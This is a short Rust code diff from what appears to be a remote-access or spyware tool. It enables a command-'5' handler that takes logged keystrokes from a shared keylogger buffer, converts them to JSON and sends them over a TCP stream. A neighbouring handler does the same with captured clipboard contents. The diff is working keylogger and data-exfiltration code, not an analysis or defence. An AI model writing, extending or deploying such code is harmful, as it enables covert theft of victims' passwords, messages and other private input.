@@ -25,7 +25,7 @@ pub async fn handle_recived_data(
             handle_get_clipboard(tcp_stream, command, clipboard_mem.clone()).await;
         }
         "5" => {
-            // handle_get_keylogg(tcp_stream,  command).await;
+            handle_get_keylog(tcp_stream,  command, key_log_mem.clone()).await;
         }
         _ => {
             // handle_unknown(tcp_stream, command).await;
@@ -33,7 +33,12 @@ pub async fn handle_recived_data(
     }
 }
 
-async fn handle_get_clipboard(tcp_stream: &mut TcpStream, command: String, clipboard_mem: Arc<Mutex<HashMap<String, String>>>) {
+async fn handle_get_keylog(tcp_stream: &mut TcpStream, _: String, key_log_mem: Arc<Mutex<Vec<KeyLoggData>>>) {
+    let data = KeyLoggData::vec_to_json(key_log_mem.lock().unwrap().clone());
+    send_text(tcp_stream, data.to_string().as_str()).await.unwrap()
+}
+
+async fn handle_get_clipboard(tcp_stream: &mut TcpStream, _: String, clipboard_mem: Arc<Mutex<HashMap<String, String>>>) {
     let data = clip_map_to_json(clipboard_mem.lock().unwrap().clone());
     send_text(tcp_stream, &data.to_string()).await.unwrap();
 }
